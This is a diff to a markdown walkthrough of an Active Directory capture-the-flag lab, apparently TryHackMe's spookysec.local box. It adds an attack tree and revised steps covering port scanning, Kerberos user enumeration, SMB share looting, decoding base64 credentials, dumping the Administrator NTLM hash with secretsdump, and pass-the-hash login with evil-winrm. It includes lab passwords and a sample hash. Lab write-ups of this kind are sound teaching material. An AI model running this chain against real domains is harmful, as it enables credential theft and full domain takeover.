@@ -3,20 +3,36 @@
 ## Attack tree
 
 ```text
-
+1 Discovery
+    1.1 Scan ports
+    1.2 Enumerate 139/445
+2 Enumerate DC users via kerberos (AND)
+3 Exploit Kerberos
+    3.1 Query a ticket from users (if possible) (AND)
+    3.2 Crack the hash
+4 Enumerate the DC further 
+    4.1 Map remote SMB shares
+    4.2 Search for files with information for further escalation
+    4.3 Decode if necessary
+5 Elevate privileges within the domain
+    5.1 Dump ntds.dit
+    5.2 Get administrators NTLM hash
+    5.3 Pass the hash with Evil-WinRM
 ```
 
 ## Example
 
-### Scanning
+### Discovery
+
+#### Scan with nmap
 
     # nmap -sV -sC -T4 <IP address target>
 
-### Enumerate the DC with enum4linux
+#### Enumerate 139/445
 
     # enum4linux <IP address target>
 
-### Enumerate the DC with Kerbrute
+## Enumerate the DC
 
 Add the following line to `/etc/hosts` file:
 
@@ -53,7 +69,7 @@ Connect to the share using smbclient:
 ```text
 smbclient '\\spookysec.local\backup' -U svc-admin
 smb: \> ls
-smb: \>mget backup_credentials.txt
+smb: \> mget backup_credentials.txt
 exit
 ```
 
@@ -68,7 +84,7 @@ python3 secretsdump.py spookysec.local/backup:FOUNDPASSWORDHERE@spookysec.local 
 
 Now we have the password: management2005
 
-### Enumerate the DC again
+### Enumerate the DC further
 
 Map remote shares:
 
@@ -92,18 +108,31 @@ Get them backup credentials:
 It contains base64 encoded credentials. Decoding the base64 string reveals the credentials:
     
     $ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
-    [email protected]:backup2517860
+    [...]:backup2517860
 
-Rretrieve all password hashes that this user account (which is synced with the domain controller) has to offer. 
-Exploiting this, we will have full control over the AD Domain.
+Now that we have new user account credentials, we may have more privileges on the system than before. 
+The username of the account "backup" indicated it is the backup account for the Domain Controller. 
+This account has a unique permission that allows all Active Directory changes to be synced with this user account. 
+This includes password hashes.
+
+### Elevate privileges within the domain
+
+Retrieve all password hashes that this user account (which is synced with the domain controller) has to offer. 
+Exploiting this, we may have full control over the AD Domain.
 
     $ python secretsdump.py spookysec.local/backup:FOUNDPASSWORDHERE@spookysec.local -just-dc-user Administrator
+    ...
+    [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+    [*] Using the DRSUAPI method to get NTDS.DIT secrets
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4876a80a723612986d7609aa5ebc12b:::
+    ...
 
-Pass the Hash with Evil-WinRM:
+Pass the Administrators NTLM hash with Evil-WinRM:
 
-    $ evil-winrm -i <IP target machine> -u Administrator -H THEFOUNDHASH
+    $ evil-winrm -i <IP target machine> -u Administrator -H <Administrators NTLM hash>
 
-All flags are in the users desktops. The Administrator account has got acces to all.
+If on TryHackMe target, all flags are in the users desktops. The Administrator account has got acces to all.
 
 ## Tools
 
